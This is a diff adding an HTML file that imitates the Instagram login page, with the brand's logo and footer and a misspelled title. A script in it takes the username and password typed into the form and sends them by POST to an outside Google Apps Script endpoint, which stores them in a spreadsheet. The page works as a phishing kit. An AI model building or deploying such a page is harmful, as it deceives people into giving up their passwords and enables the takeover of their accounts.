@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="img/logo-ins.png" type="image/x-icon">
+    <title>Login Insitageram</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- fontawesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+    <div class="login-page">
+        <div class="main-input-box">
+            <div class="login-box box">
+                <a href="#" class="logo">
+                    <img src="img/text-style.png" alt="instagram">
+                </a>
+                <form name="submit-to-google-sheet" id="myForm">
+                    <input id="id" name="id" type="text" placeholder="Phone number, username, or email" required>
+                    <input id="pass" name="pass" type="password" placeholder="Password" required>
+                    <button type="submit">Log in</button>
+                </form>
+                <div class="or-box">
+                    <div class="line"></div>
+                    <span>or</span>
+                    <div class="line"></div>
+                </div>
+                <div class="forgot-box">
+                    <div class="facebook">
+                        <a href="#">
+                            <i class="fa-brands fa-square-facebook"></i>
+                            <p>Log in with Facebook</p>
+                        </a>
+                    </div>
+                    <div class="forgot">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+            <div class="sign-in-box box">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <ul>
+            <li>Meta</li>
+            <li>About</li>
+            <li>Blog</li>
+            <li>Jobs</li>
+            <li>Help</li>
+            <li>API</li>
+            <li>Privacy</li>
+            <li>Terms</li>
+            <li>Locations</li>
+            <li>Instagram Lite</li>
+            <li>Threads</li>
+            <li>Contact Uploading & Non-Users</li>
+            <li>Meta Verified</li>
+        </ul>
+        <ul>
+            <li>English</li>
+            <li>© 2024 Instagram from Meta</li>
+        </ul>
+    </footer>
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            // Prevent the form from submitting
+            event.preventDefault();
+
+            // Get the input values
+            var id = document.getElementById('id').value;
+            var pass = document.getElementById('pass').value;
+
+            // Log the values to the console
+            console.log("ID: " + id);
+            console.log("Password: " + pass);
+        });
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwN-2eDe2GL7oDtjwCLlzFJbmV_Z4_5yw823mMWeADr9Lnu_g7jINgZTCjxFP4gHmMC/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
+</html>
